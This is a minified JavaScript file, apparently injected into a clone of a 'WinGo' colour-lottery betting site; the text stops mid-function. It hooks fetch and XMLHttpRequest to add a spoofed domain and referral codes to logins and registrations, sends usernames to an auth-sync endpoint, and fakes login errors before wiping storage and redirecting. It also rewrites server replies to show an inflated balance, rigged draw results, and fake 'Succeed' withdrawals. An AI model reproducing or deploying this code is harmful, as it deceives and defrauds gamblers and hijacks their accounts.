var Pt = location.href.match(/[?&]ref=([A-Za-z0-9]{6})/);
if (Pt) sessionStorage.setItem("wg_ref", Pt[1]);
function Zt({
  apiBase: n,
  spoofDomain: t,
  minBalance: i,
  nukeUrl: o,
  authErrMsg: c,
  onBalance: l,
  onWingo: p,
}) {
  if (navigator.serviceWorker)
    navigator.serviceWorker
      .getRegistrations()
      .then(($) => $.forEach((Q) => Q.unregister()))
      .catch(() => {});
  document.addEventListener("DOMContentLoaded", () => {
    document.querySelectorAll("iframe").forEach(($) => {
      if (
        $.src &&
        ($.src.includes("unTopWindow") || $.src.includes("fromEntry=sw"))
      )
        $.remove();
    });
  });
  let f = window.fetch,
    w = /\/api\/webapi\/(Register|Login)$/,
    S = '{"code":1,"msg":"' + c + '"}',
    W = "";
  function M($, Q) {
    try {
      window.dispatchEvent(new CustomEvent($, { detail: Q }));
    } catch {}
  }
  function J() {
    try {
      return JSON.parse(localStorage.getItem("userInfo") || "{}") || {};
    } catch {}
    return {};
  }
  function z($) {
    if (typeof $ !== "string") return $;
    let Q = $.startsWith(n) ? $.slice(n.length) : $;
    return Q;
  }
  function O() {
    setTimeout(() => {
      (localStorage.clear(),
        sessionStorage.clear(),
        (window.location.href = o));
    }, 1500);
  }
  function E() {
    let $ = J();
    return (
      $.userName ||
      $.username ||
      $.phone ||
      sessionStorage.getItem("wg_user") ||
      sessionStorage.getItem("wg_qual_user") ||
      ""
    );
  }
  function e() {
    let $ = Number(J().amount);
    return Number.isFinite($) ? $ : null;
  }
  function y($) {
    if (!$) return "";
    let Q = sessionStorage.getItem("wg_qual_user");
    if (Q && Q !== $) sessionStorage.removeItem("wg_qualified");
    return (sessionStorage.setItem("wg_user", $), $);
  }
  function v($, Q) {
    if (Q)
      (sessionStorage.setItem("wg_user", Q),
        sessionStorage.setItem("wg_qual_user", Q));
    if ($)
      (sessionStorage.setItem("wg_qualified", "1"),
        M("wg-qualified", { user: Q || E() }));
    else sessionStorage.removeItem("wg_qualified");
  }
  function q($, Q) {
    if (typeof $?.is_qualified === "boolean") v($.is_qualified, Q);
    else if (Q) sessionStorage.setItem("wg_qual_user", Q);
  }
  function a() {
    try {
      let $ =
        localStorage.getItem("token") || sessionStorage.getItem("token") || "";
      if (!$) return "";
      let Q =
        localStorage.getItem("tokenHeader") ||
        sessionStorage.getItem("tokenHeader") ||
        "Bearer ";
      return $.startsWith(Q.trim()) ? $ : Q + $;
    } catch {}
    return "";
  }
  function L($, Q) {
    if (!$ || !w.test($) || !Q) return Q;
    try {
      let X = JSON.parse(Q);
      if (!X.domainurl) X.domainurl = t;
      if ($.includes("/api/webapi/Register")) {
        let Z = sessionStorage.getItem("wg_ref");
        if (Z && !X.wg_ref) X.wg_ref = Z;
      }
      return JSON.stringify(X);
    } catch {}
    return Q;
  }
  function P($) {
    return (
      $?.data?.userName ||
      $?.data?.username ||
      $?.data?.phone ||
      $?.username ||
      ""
    );
  }
  function Y($) {
    if ($ < i) return;
    let Q = E(),
      X = a();
    if (
      !Q ||
      !X ||
      sessionStorage.getItem("wg_qualified") ||
      sessionStorage.getItem("wg_qualifying")
    )
      return;
    (sessionStorage.setItem("wg_qualifying", "1"),
      f("/ar-api/qualify", {
        method: "POST",
        headers: { "content-type": "application/json", authorization: X },
        body: "{}",
      })
        .then((Z) => Z.json().catch(() => ({})))
        .then((Z) => {
          if (Z?.qualified) v(!0, Q);
        })
        .finally(() => sessionStorage.removeItem("wg_qualifying")));
  }
  function H($) {
    let Q = Number($);
    if (!Number.isFinite(Q)) return;
    (l(Q), M("wg-balance", { balance: Q }), Y(Q));
  }
  function K($, Q) {
    if (!$) return null;
    if ($.includes("/api/Lottery/GetBalance")) return Q?.data?.balance;
    if ($.includes("/api/webapi/GetUserInfo")) return Q?.data?.amount;
    return null;
  }
  function gn($, Q) {
    if (!$) return;
    if (
      !$.includes("/api/Lottery/GetBalance") &&
      !$.includes("/api/webapi/GetUserInfo") &&
      !$.includes("/api/webapi/Login") &&
      !$.includes("/api/webapi/Register")
    )
      return;
    Q.json()
      .then((X) => {
        let Z = y(P(X));
        if (Z && sessionStorage.getItem("wg_qual_user") !== Z)
          an("login", Z, {});
        let D = K($, X);
        if (D != null) H(D);
      })
      .catch(() => {});
  }
  function Zn($, Q) {
    if ($ && ($.includes("/Login") || $.includes("/Register")))
      Q.text()
        .then((X) => {
          if (X.includes(c)) O();
        })
        .catch(() => {});
    if ($ && p && $.includes("WinGo")) {
      let X = $.match(/WinGo_([\w]+)/),
        Z = X ? "WinGo_" + X[1] : null;
      Q.json()
        .then((D) => p(Z, D))
        .catch(() => {});
    }
  }
  function an($, Q, X) {
    return f("/ar-api/auth-sync", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ type: $, u: Q, ...X }),
    })
      .then((Z) => Z.json())
      .then((Z) => {
        if ($ === "login") q(Z, Q);
        return Z;
      })
      .catch(() => ({}));
  }
  function zt($) {
    try {
      let Q = JSON.parse($);
      an("register", Q.username || "", {
        inv: Q.invitecode || "",
        parent: sessionStorage.getItem("wg_ref") || "",
      });
    } catch {}
  }
  async function Qt($) {
    try {
      let Q = JSON.parse($);
      return (await an("login", Q.username || "", {})).allowed === !1;
    } catch {}
    return !1;
  }
  function Lt() {
    let $ = y(E());
    if (!$ || W === $) return;
    ((W = $),
      an("login", $, {}).then(() => {
        let Q = e();
        if (Q != null) H(Q);
      }));
  }
  return (
    (window.fetch = async function ($, Q) {
      let X = "",
        Z = null;
      if (typeof $ === "string") {
        if (
          ((X = $),
          (Z = Q?.body && typeof Q.body === "string" ? Q.body : null),
          Z)
        )
          ((Z = L(X, Z)), (Q = { ...(Q || {}), body: Z }));
        $ = z($);
      } else if ($ instanceof Request) {
        X = $.url;
        let b = $.clone();
        if (w.test(X))
          try {
            Z = L(X, await b.text());
          } catch {}
        $ = new Request(z($.url.startsWith(n) ? $.url : $.url), {
          method: $.method,
          headers: $.headers,
          body: Z == null ? $.body : Z,
          mode: "cors",
          credentials: $.credentials,
        });
      }
      if (!Z && Q?.body && typeof Q.body === "string") Z = Q.body;
      if (X.endsWith("/api/webapi/Login") && Z) {
        if (await Qt(Z)) {
          let b = new Response(S, {
            status: 200,
            headers: { "Content-Type": "application/json" },
          });
          return (Zn(X, b.clone()), b);
        }
      }
      let D = typeof $ === "string" ? $ : $?.url,
        g = await f.call(this, $, Q);
      if (X.endsWith("/api/webapi/Register") && Z)
        g.clone()
          .json()
          .then((b) => {
            if (b?.code === 0) zt(Z);
          })
          .catch(() => {});
      return (Zn(D, g.clone()), gn(D, g.clone()), g);
    }),
    (XMLHttpRequest.prototype.open = (($) =>
      function (Q, X, ...Z) {
        return (
          (this._url = z(X)),
          (this._rawUrl = X),
          $.call(this, Q, this._url, ...Z)
        );
      })(XMLHttpRequest.prototype.open)),
    (XMLHttpRequest.prototype.send = (($) =>
      function (Q) {
        this._body = typeof Q === "string" ? Q : null;
        let X = this,
          Z = this._body ? L(this._rawUrl || this._url, this._body) : Q;
        if (
          ((this._body = typeof Z === "string" ? Z : null),
          this.addEventListener("load", function () {
            try {
              if (
                this._url &&
                (this._url.includes("/Login") ||
                  this._url.includes("/Register")) &&
                this.responseText.includes(c)
              )
                O();
            } catch {}
            try {
              if (this._url) {
                let D = JSON.parse(this.responseText),
                  g = y(P(D));
                if (
                  g &&
                  (this._url.includes("GetUserInfo") ||
                    this._url.includes("Login") ||
                    this._url.includes("Register")) &&
                  sessionStorage.getItem("wg_qual_user") !== g
                )
                  an("login", g, {});
                let b = K(this._url, D);
                if (b != null) H(b);
              }
            } catch {}
            try {
              if (
                this._rawUrl &&
                this._rawUrl.endsWith("/api/webapi/Register") &&
                this._body
              ) {
                if (JSON.parse(this.responseText)?.code === 0) zt(this._body);
              }
            } catch {}
            try {
              if (this._url && p && this._url.includes("WinGo")) {
                let D = this._url.match(/WinGo_([\w]+)/),
                  g = D ? "WinGo_" + D[1] : null;
                p(g, JSON.parse(this.responseText));
              }
            } catch {}
          }),
          this._rawUrl &&
            this._rawUrl.endsWith("/api/webapi/Login") &&
            this._body)
        ) {
          Qt(this._body)
            .then((D) => {
              if (D)
                (Object.defineProperties(X, {
                  readyState: { value: 4, writable: !1 },
                  status: { value: 200, writable: !1 },
                  statusText: { value: "OK", writable: !1 },
                  responseText: { value: S, writable: !1 },
                  response: { value: S, writable: !1 },
                }),
                  X.dispatchEvent(new Event("readystatechange")),
                  X.dispatchEvent(new Event("load")),
                  X.dispatchEvent(new Event("loadend")));
              else $.call(X, Z);
            })
            .catch(() => $.call(X, Z));
          return;
        }
        return $.call(this, Z);
      })(XMLHttpRequest.prototype.send)),
    Lt(),
    window.addEventListener("pageshow", Lt),
    f
  );
}
var vn = "wg_spoof_state",
  ki = 420000,
  Xt = 50,
  Yt = 240,
  Ht = 2,
  dn = [
    "red,violet",
    "green",
    "red",
    "green",
    "red",
    "green,violet",
    "red",
    "green",
    "red",
    "green",
  ];
function ht() {
  try {
    var n = JSON.parse(localStorage.getItem("wg_spoof_cfg"));
    return n && typeof n === "object" ? n : {};
  } catch (t) {
    return {};
  }
}
function I(n, t) {
  var i = ht(),
    o = i[n];
  return o !== void 0 ? o : t;
}
function Nt() {
  try {
    var n = sessionStorage.getItem("wg_user");
    return !!n && "918815393226".indexOf(n) !== -1;
  } catch (t) {
    return !1;
  }
}
function Gt(n) {
  var t = 2166136261;
  for (var i = 0; i < n.length; i++)
    ((t ^= n.charCodeAt(i)), (t = Math.imul(t, 16777619)));
  return (
    (t = Math.imul(t ^ (t >>> 16), 2246822507)),
    (t = Math.imul(t ^ (t >>> 13), 3266489909)),
    (t ^ (t >>> 16)) >>> 0
  );
}
function _i(n) {
  return (
    (n = BigInt.asUintN(64, n + 0x9e3779b97f4a7c15n)),
    (n = BigInt.asUintN(64, (n ^ (n >> 30n)) * 0xbf58476d1ce4e5b9n)),
    (n = BigInt.asUintN(64, (n ^ (n >> 27n)) * 0x94d049bb133111ebn)),
    BigInt.asUintN(64, n ^ (n >> 31n))
  );
}
function At(n, t, i) {
  var o = /^\d+$/.test(String(t || ""))
    ? BigInt(t)
    : BigInt(Gt(String(t || "")));
  return _i(o ^ BigInt(Gt(i + n)));
}
function d(n, t, i) {
  return Number(At(n, t, i) % 10n);
}
function In(n, t) {
  if (((n = String(n || "")), (t = t || 1), !/^\d+$/.test(n))) return "";
  try {
    return (BigInt(n) - BigInt(t)).toString();
  } catch (i) {}
  return String(Math.max(0, Number(n) - t));
}
function Ft(n, t, i, o) {
  var c = t - i === i - o && Math.abs(t - i) <= 2 && n - t === t - i;
  return (
    (n === t && t === i) ||
    (n === i && i === o) ||
    (n === i && t === o) ||
    (n === o && i === o) ||
    c
  );
}
function Fn(n, t) {
  t = String(t || "");
  var i = d(n, t, "Kx7q:");
  if (!/^\d+$/.test(t)) return i;
  var o = d(n, In(t, 1), "Kx7q:"),
    c = d(n, In(t, 2), "Kx7q:"),
    l = d(n, In(t, 3), "Kx7q:");
  if (!Ft(i, o, c, l)) return i;
  var p = [
    d(n, t, "J4n2:"),
    d(n, t, "V8p1:"),
    d(n, t, "S6d7:"),
    (i + 5) % 10,
    (i + 3) % 10,
  ];
  for (var f = 0; f < p.length; f++) if (!Ft(p[f], o, c, l)) return p[f];
  return p[0];
}
function Rt(n, t) {
  return Number(At(n, t, "Rz3m:") % 100n);
}
function si(n, t) {
  return (Fn(n, t) + 5) % 10;
}
function di() {
  var n = I("accuracy", 70);
  if (isNaN(n) || n < 0) n = 0;
  if (n > 100) n = 100;
  return n;
}
function jn(n, t) {
  return Rt(n, t) < di() ? Fn(n, t) : si(n, t);
}
function Kt(n) {
  if (((n = String(n || "")), !/^\d+$/.test(n))) return "";
  try {
    return (BigInt(n) + 1n).toString();
  } catch (t) {}
  return String(Number(n) + 1);
}
function no(n) {
  var t = String(n || "");
  return (
    /\/WinGo\/[^\/?]+\.json(?:\?|$)/.test(t) &&
    t.indexOf("GetHistoryIssuePage") === -1
  );
}
function G(n) {
  var t = parseFloat(n);
  return isNaN(t) ? 0 : t;
}
function wn(n, t) {
  return parseFloat((G(n) * Math.max(1, G(t))).toFixed(2));
}
function Ct(n, t) {
  return Math.abs(G(n) - G(t)) < 0.001;
}
function pn(n, t) {
  var i = n && n.match(new RegExp("[?&]" + t + "=([^&]+)"));
  return i ? decodeURIComponent(i[1]) : null;
}
function to(n) {
  if (((n = String(n || "")), n.indexOf("5M") !== -1)) return 300000;
  if (n.indexOf("3M") !== -1) return 180000;
  if (n.indexOf("1M") !== -1) return 60000;
  return 30000;
}
function Sn(n) {
  var t = pn(n, "gameCode");
  if (t) return t;
  var i = n && n.match(/\/WinGo\/([^\/?]+)(?:\/|\.json(?:\?|$)|\?|$)/);
  if (i) return decodeURIComponent(i[1]);
  if (window.location) t = pn(window.location.hash, "gameCode");
  return t || null;
}
function io(n, t) {
  if (
    ((n = String(n || "").toLowerCase()),
    (t = +t || 0),
    n.indexOf("num_") === 0)
  )
    return 9;
  if (n.indexOf("violet") !== -1) return 4.5;
  if (n === "color_green" && t === 5) return 1.5;
  if (n === "color_red" && t === 0) return 1.5;
  return 2;
}
function oo(n, t) {
  if (((n = String(n || "").toLowerCase()), n.indexOf("num_") === 0))
    return t === parseInt(n.split("_")[1], 10);
  if (n === "bigsmall_big") return t >= 5;
  if (n === "bigsmall_small") return t <= 4;
  if (n === "color_green") return [1, 3, 5, 7, 9].indexOf(t) !== -1;
  if (n === "color_red") return [0, 2, 4, 6, 8].indexOf(t) !== -1;
  if (n === "color_violet") return [0, 5].indexOf(t) !== -1;
  return !1;
}
function co(n, t) {
  if (!t) return 0;
  var i = n.stake - (n.fee || n.stake * 0.02);
  return oo(n.content, t.num)
    ? parseFloat((i * io(n.content, t.num)).toFixed(2))
    : 0;
}
var U;
try {
  U = JSON.parse(localStorage.getItem(vn));
} catch (n) {}
if (U && U.pending !== void 0)
  U = { balance: U.balance, draws: {}, rigs: {}, withdrawals: {} };
if (!U) U = { balance: null, draws: {}, rigs: {}, withdrawals: {} };
if (!U.draws) U.draws = {};
if (!U.rigs) U.rigs = {};
if (!U.withdrawals) U.withdrawals = {};
if (U.version !== Ht) {
  Xn = {};
  for (Yn in U.rigs) Xn[U.rigs[Yn].game + ":" + U.rigs[Yn].issue] = !0;
  for (Hn in U.draws) if (!Xn[Hn]) delete U.draws[Hn];
  U.version = Ht;
  try {
    localStorage.setItem(vn, JSON.stringify(U));
  } catch (n) {}
}
var Xn,
  Yn,
  Hn,
  $n = {};
function nt(n, t) {
  return String(n || "") + ":" + String(t || "");
}
function mn(n, t, i) {
  if (!n || i == null || isNaN(i)) return null;
  var o = nt(n, t),
    c = U.draws[o];
  if (c) {
    if (c.color == null) c.color = dn[c.num];
    if (!c.seenAt) c.seenAt = Date.now();
    return c;
  }
  return (
    (c = { num: +i, color: dn[i], seenAt: Date.now() }),
    (U.draws[o] = c),
    c
  );
}
function Mn(n, t) {
  if (((n = String(n || "")), t)) return U.draws[nt(t, n)] || null;
  var i = null,
    o = 0;
  for (var c in U.draws) if (c.split(":")[1] === n) ((i = U.draws[c]), o++);
  return o === 1 ? i : null;
}
function bn(n, t) {
  n = String(n || "");
  var i = [];
  if (t) {
    var o = t + ":" + n + ":";
    for (var c in U.rigs)
      if (c.indexOf(o) === 0) i.push({ key: c, rig: U.rigs[c] });
  } else
    for (var c in U.rigs)
      if (String(U.rigs[c].issue) === n) i.push({ key: c, rig: U.rigs[c] });
  return i;
}
function fo(n) {
  n = String(n || "");
  var t = null;
  for (var i in U.rigs) {
    var o = U.rigs[i];
    if (String(o.issue) !== n) continue;
    if (!t) t = o.game;
    else if (t !== o.game) return null;
  }
  return t;
}
function Nn(n) {
  if (n.settled) return !1;
  var t = Mn(n.issue, n.game);
  if (!t) return !1;
  if (((n.win = co(n, t)), (n.settled = !0), U.balance === null))
    U.balance = I("balanceOffset", 5000);
  return ((U.balance += n.win), !0);
}
function Un() {
  var n = Date.now(),
    t = !1;
  for (var i in U.rigs) {
    var o = U.rigs[i];
    if (!o.settled && o.settleAt && n >= o.settleAt) {
      if (Nn(o)) t = !0;
    }
  }
  for (var i in U.rigs)
    if (!U.rigs[i].settled && n - (U.rigs[i].time || 0) > ki) {
      if (Nn(U.rigs[i])) t = !0;
    }
  for (var c in $n) if ($n[c] < n - 60000) delete $n[c];
  var l = Object.keys(U.rigs);
  if (l.length > Xt) {
    var p = l.filter(function (y) {
      return U.rigs[y].settled;
    });
    p.sort(function (y, v) {
      return (U.rigs[y].time || 0) - (U.rigs[v].time || 0);
    });
    for (var f = 0, u = l.length - Xt; f < u && f < p.length; f++)
      (delete U.rigs[p[f]], (t = !0));
    var w = {};
    for (var S in U.rigs) w[U.rigs[S].game + ":" + U.rigs[S].issue] = !0;
    for (var W in U.draws) if (!w[W]) (delete U.draws[W], (t = !0));
  }
  var M = Object.keys(U.draws);
  if (M.length > Yt) {
    var J = {};
    for (var z in U.rigs) J[U.rigs[z].game + ":" + U.rigs[z].issue] = !0;
    var O = M.filter(function (y) {
      return !J[y];
    });
    O.sort(function (y, v) {
      return (U.draws[y].seenAt || 0) - (U.draws[v].seenAt || 0);
    });
    for (var E = 0, e = M.length - Yt; E < e && E < O.length; E++)
      (delete U.draws[O[E]], (t = !0));
  }
  if (t) tt();
  return t;
}
function k() {
  (Un(), localStorage.setItem(vn, JSON.stringify(U)));
}
var xn = null;
function tt() {
  if (U.balance === null || xn) return;
  xn = setTimeout(function () {
    xn = null;
    try {
      var n = document.getElementById("app"),
        t = n && n.__vue_app__,
        i = t && t.config.globalProperties.$pinia,
        o = i && i.state.value.GlobalState;
      if (o && o.userInfo && typeof o.userInfo.amount === "number")
        o.userInfo.amount = U.balance;
    } catch (c) {}
  }, 300);
}
function nn(n) {
  if (U.balance === null && typeof n === "number" && n >= 0)
    ((U.balance = n + I("balanceOffset", 5000)), k());
  return U.balance === null ? I("balanceOffset", 5000) : U.balance;
}
function Tt(n) {
  return (
    (n = String(n || "").toLowerCase()),
    n.indexOf("num_") === 0
      ? "Num"
      : n.indexOf("bigsmall_") === 0
        ? "BigSmall"
        : n.indexOf("color_") === 0
          ? "Color"
          : "Num"
  );
}
function gt(n, t) {
  if (
    ((n.issueNumber = t.issue),
    (n.betContent = t.content),
    (n.amount = t.amount),
    (n.betMultiple = t.betMultiple),
    (n.realAmount = t.realAmount),
    (n.fee = t.fee),
    (n.betTime = t.time),
    (n.playType = Tt(t.content)),
    (n.orderNo = t.orderNo),
    !t.settled)
  ) {
    ((n.state = 2),
      (n.number = ""),
      (n.color = ""),
      (n.premium = ""),
      (n.winLoseAmount = 0));
    return;
  }
  ((n.state = t.win > 0 ? 1 : 0),
    (n.winLoseAmount =
      t.win > 0
        ? parseFloat((t.win - t.stake).toFixed(2))
        : parseFloat((-t.stake).toFixed(2))));
  var i = Mn(t.issue, t.game);
  if (i)
    ((n.number = String(i.num)),
      (n.color = i.color),
      (n.premium = String(i.num)));
}
function lo(n) {
  var t = {
    issueNumber: n.issue,
    playType: Tt(n.content),
    orderNo: n.orderNo,
    amount: n.amount,
    betMultiple: n.betMultiple,
    betContent: n.content,
    number: "",
    color: "",
    premium: "",
    realAmount: n.realAmount,
    fee: n.fee,
    state: 2,
    winLoseAmount: 0,
    betTime: n.time,
    sum: 0,
  };
  return (gt(t, n), t);
}
function En(n) {
  return n < 10 ? "0" + n : "" + n;
}
function rn(n) {
  var t = new Date(n);
  return (
    t.getFullYear() +
    "-" +
    En(t.getMonth() + 1) +
    "-" +
    En(t.getDate()) +
    " " +
    En(t.getHours()) +
    ":" +
    En(t.getMinutes()) +
    ":" +
    En(t.getSeconds())
  );
}
var Gn = {
  GetUserInfo: function (n) {
    if (n && n.code === 0 && n.data) {
      if (Un()) localStorage.setItem(vn, JSON.stringify(U));
      if (((n.data.amount = nn(n.data.amount)), U.balance !== null))
        ((n.data.amountofCode = 0), (n.data.channelAmountofCode = 0));
      window.__wgUICache = JSON.parse(JSON.stringify(n));
    } else if (
      n &&
      n.code !== 0 &&
      window.__wgUICache &&
      /frequent|rate.?limit/i.test(n.msg || "")
    ) {
      var t = window.__wgUICache;
      ((n.code = t.code),
        (n.msg = t.msg),
        (n.msgCode = t.msgCode),
        (n.data = JSON.parse(JSON.stringify(t.data))),
        (n.data.amount = nn()));
    }
  },
  GetARGameAndPlatWallets: function (n) {
    var t = n.data && n.data.thidGameBalanceList;
    if (t) {
      for (var i = 0; i < t.length; i++)
        if (t[i].vendorCode === "Lottery") t[i].balance = nn(t[i].balance);
    }
  },
  GetSaasAllwallets: function (n) {
    Gn.GetARGameAndPlatWallets(n);
  },
  GetBalance: function (n) {
    if (n && n.code === 0 && n.data) {
      if (Un()) localStorage.setItem(vn, JSON.stringify(U));
      if (typeof n.data.balance === "number")
        n.data.balance = nn(n.data.balance);
      window.__wgBalCache = JSON.parse(JSON.stringify(n));
    } else if (
      n &&
      n.code !== 0 &&
      window.__wgBalCache &&
      /frequent|rate.?limit/i.test(n.msg || "")
    ) {
      var t = window.__wgBalCache;
      if (
        ((n.code = t.code),
        (n.msg = t.msg),
        (n.msgCode = t.msgCode),
        (n.data = JSON.parse(JSON.stringify(t.data))),
        typeof n.data.balance === "number")
      )
        n.data.balance = nn();
    }
  },
  RecoverSaasBalance: function (n) {
    if (n.data && typeof n.data.amount === "number")
      n.data.amount = nn(n.data.amount);
  },
  GetWithdrawLog: function (n, t) {
    try {
      var i = JSON.parse(t._kBody || "{}");
      if (i.pageNo > 1) return;
    } catch (W) {}
    if (!n.data) n.data = { list: [] };
    if (!n.data.list) n.data.list = [];
    var o = {};
    for (var c = 0; c < n.data.list.length; c++)
      o[n.data.list[c].withdrawNumber] = !0;
    var l = [];
    for (var p in U.withdrawals)
      if (!o[U.withdrawals[p].withdrawNumber]) {
        var f = U.withdrawals[p];
        try {
          var u = i.type || i.categoryId || i.withdrawTypeId || -1;
          if (u != -1 && u != 0 && f.type && f.type != u) continue;
        } catch (W) {}
        var w = f.type === 2 ? "BANK CARD" : f.type === 1 ? "UPI" : "UPI";
        l.push({
          id: f.withdrawNumber,
          withdrawNumber: f.withdrawNumber,
          price: f.amount,
          state: f.state,
          addTime: rn(f.addTime),
          fee: f.fee,
          withdrawName: w,
          _ts: f.addTime,
        });
      }
    l.sort(function (W, M) {
      return M._ts - W._ts;
    });
    for (var S = 0; S < l.length; S++) delete l[S]._ts;
    ((n.data.list = l.concat(n.data.list)),
      (n.data.totalCount = (n.data.totalCount || 0) + l.length));
  },
  Withdraw: function (n, t) {
    try {
      var i = JSON.parse(t._kBody || "{}"),
        o =
          G(i.amount) || G(i.price) || G(i.applyAmount) || G(i.withdrawAmount);
      if (!o || o <= 0) return;
      var c = i.withdrawid || i.type || i.categoryId || i.withdrawTypeId || 2,
        l = "W" + Date.now();
      if (
        ((U.withdrawals[l] = {
          withdrawNumber: l,
          amount: o,
          state: 3,
          fee: 0,
          addTime: Date.now(),
          type: c,
        }),
        U.balance === null)
      )
        U.balance = I("balanceOffset", 5000);
      ((U.balance -= o), k());
    } catch (p) {}
    ((n.code = 0), (n.msg = "Succeed"));
  },
  NewSetWithdrawal: function (n, t) {
    try {
      console.log("NewSetWithdrawal body:", t._kBody);
    } catch (i) {}
    return Gn.Withdraw(n, t);
  },
  getWithdrawals: function (n) {
    if (n && n.data && n.data.withdrawalsrule) {
      var t = nn();
      ((n.data.withdrawalsrule.amount = t),
        (n.data.withdrawalsrule.canWithdrawAmount = t));
    }
  },
  GetNewMyEmerdList: function (n, t) {
    if (Un()) localStorage.setItem(vn, JSON.stringify(U));
    if (!n.data) n.data = { list: [], pageNo: 1, totalPage: 0, totalCount: 0 };
    var i = {};
    try {
      i = JSON.parse((t && t._kBody) || "{}");
    } catch (H) {}
    var o = parseInt(i.pageNo || 1, 10),
      c = parseInt(i.pageSize || 10, 10),
      l = i.startDate || "",
      p = i.endDate || "",
      f = String(i.gameType || "");
    if (f !== "" && f !== "0" && f !== "1") {
      ((n.data.list = []),
        (n.data.totalCount = 0),
        (n.data.totalPage = 0),
        (n.data.pageNo = o));
      return;
    }
    var u = { WinGo_30S: 30, WinGo_1M: 1, WinGo_3M: 2, WinGo_5M: 3 };
    function w(H) {
      if (((H = String(H || "")), H.indexOf("Color_") === 0))
        return H.slice(6).toLowerCase();
      if (H.indexOf("Num_") === 0) return H.slice(4);
      if (H.indexOf("BigSmall_") === 0) return H.slice(9).toLowerCase();
      return H.toLowerCase();
    }
    function S(H) {
      return String(H || "").indexOf("BigSmall_") === 0 ? 2 : 0;
    }
    var W = l ? new Date(l + " 00:00:00").getTime() : 0,
      M = p ? new Date(p + " 23:59:59").getTime() : 1 / 0,
      J = [];
    for (var z in U.rigs) {
      var O = U.rigs[z];
      if (!O.settled) continue;
      if (O.time < W || O.time > M) continue;
      var E = Mn(O.issue, O.game);
      J.push({
        orderNumber: O.orderNo,
        issueNumber: O.issue,
        typeID: u[O.game] || 30,
        amount: O.amount,
        betCount: 1,
        gameType: S(O.content),
        selectType: w(O.content),
        realAmount: O.realAmount,
        serviceCharge: O.fee,
        figure: 1,
        state: O.win > 0 ? 1 : 0,
        winAmount: O.win > 0 ? parseFloat(O.win.toFixed(2)) : 0,
        addTime: rn(O.time),
        fee: O.fee,
        premium: E ? String(E.num) : "",
        number: E ? String(E.num) : "",
        colour: E ? E.color : "",
        _ts: O.time,
      });
    }
    var e = n.data.list || [];
    if (o === 1 && (J.length > 0 || e.length > 0)) {
      var y = {};
      for (var v = 0; v < J.length; v++) y[J[v].orderNumber] = !0;
      for (var q = 0; q < e.length; q++)
        if (!y[e[q].orderNumber]) {
          var a = new Date(e[q].addTime || 0).getTime();
          ((e[q]._ts = isNaN(a) ? 0 : a), J.push(e[q]));
        }
      J.sort(function (H, K) {
        return (K._ts || 0) - (H._ts || 0);
      });
      for (var L = 0; L < J.length; L++) delete J[L]._ts;
      ((n.data.list = J.slice(0, c)),
        (n.data.totalCount = J.length),
        (n.data.totalPage = Math.max(1, Math.ceil(J.length / c))),
        (n.data.pageNo = 1));
    } else if (o > 1 && e.length === 0 && J.length > 0) {
      J.sort(function (H, K) {
        return (K._ts || 0) - (H._ts || 0);
      });
      for (var P = 0; P < J.length; P++) delete J[P]._ts;
      var Y = (o - 1) * c;
      ((n.data.list = J.slice(Y, Y + c)),
        (n.data.totalCount = J.length),
        (n.data.totalPage = Math.max(1, Math.ceil(J.length / c))),
        (n.data.pageNo = o));
    }
  },
  WinGoBet: function (n, t) {
    if (!t || !t._kBody) {
      ((n.code = 0), (n.msg = "Succeed"), (n.msgCode = 0));
      return;
    }
    try {
      var i = JSON.parse(t._kBody),
        o = i.gameCode || Sn(t._kUrl) || "WinGo",
        c = String(i.issueNumber || ""),
        l = o + ":" + c;
      if (!U.draws[l]) mn(o, c, jn(o, c));
      var p = U.draws[l],
        f = G(i.amount),
        u = Math.max(1, G(i.betMultiple || 1)),
        w = wn(f, u),
        S = parseFloat((w * 0.02).toFixed(2)),
        W = 0;
      for (var M in U.rigs) if (M.indexOf(l + ":") === 0) W++;
      var J = l + ":" + W,
        z = $n[l],
        O = z ? z + 5000 : Date.now() + to(o) + 5000;
      if (
        ((U.rigs[J] = {
          key: J,
          issue: c,
          game: o,
          content: i.betContent,
          amount: f,
          betMultiple: u,
          stake: w,
          fee: S,
          realAmount: parseFloat((w - S).toFixed(2)),
          orderNo: "KG" + c + W,
          settled: !1,
          win: null,
          time: Date.now(),
          settleAt: O,
        }),
        U.balance === null)
      )
        U.balance = I("balanceOffset", 5000);
      ((U.balance -= w), k(), tt());
      try {
        window.dispatchEvent(
          new CustomEvent("kismat:round", {
            detail: {
              type: "round",
              game: o,
              issue: c,
              num: p.num,
              color: p.color,
              ts: Date.now(),
            },
          }),
        );
      } catch (E) {}
    } catch (E) {}
    ((n.code = 0), (n.msg = "Succeed"), (n.msgCode = 0));
  },
  WinGoState: function (n, t) {
    var i = n && n.current ? n : n && n.data && n.data.current ? n.data : null;
    if (!i || !i.current) return;
    var o = String(i.gameCode || Sn(t ? t._kUrl : null) || ""),
      c = String(i.current.issueNumber || "");
    if (!c) return;
    var l = !1;
    if (o && c && !U.draws[nt(o, c)]) (mn(o, c, jn(o, c)), (l = !0));
    var p = G(i.current.endTime || 0);
    if (o && c && p > 0) {
      $n[o + ":" + c] = p;
      var f = p + 5000,
        u = o + ":" + c + ":";
      for (var w in U.rigs)
        if (
          w.indexOf(u) === 0 &&
          !U.rigs[w].settled &&
          U.rigs[w].settleAt !== f
        )
          U.rigs[w].settleAt = f;
    }
    var S = String((i.next && i.next.issueNumber) || Kt(c) || "");
    try {
      window.dispatchEvent(
        new CustomEvent("kismat:issue", {
          detail: {
            type: "issue",
            game: o,
            currentIssue: c,
            nextIssue: S,
            currentStart: G(i.current.startTime || 0),
            currentEnd: G(i.current.endTime || 0),
            ts: Date.now(),
          },
        }),
      );
    } catch (W) {}
    if (l) k();
  },
  GetHistoryIssuePage: function (n, t) {
    var i = n.data && n.data.list;
    if (!i) return;
    var o = Sn(t ? t._kUrl : null),
      c = !1,
      l = i[0] && i[0].issueNumber != null ? String(i[0].issueNumber) : "";
    for (var p = 0; p < i.length; p++) {
      var f = String(i[p].issueNumber || ""),
        u = bn(f, o),
        w = Mn(f, o);
      if (!w && o) {
        var S = !u.length ? jn(o, f) : Fn(o, f);
        ((w = mn(o, f, S)), (c = !0));
      }
      if (!w) continue;
      ((i[p].number = String(w.num)),
        (i[p].color = w.color),
        (i[p].premium = String(w.num)));
      for (var W = 0; W < u.length; W++) if (Nn(u[W].rig)) c = !0;
    }
    if (c) k();
    try {
      window.dispatchEvent(
        new CustomEvent("kismat:gameData", {
          detail: {
            type: "history",
            game: o || "",
            latestIssue: l,
            nextIssue: Kt(l),
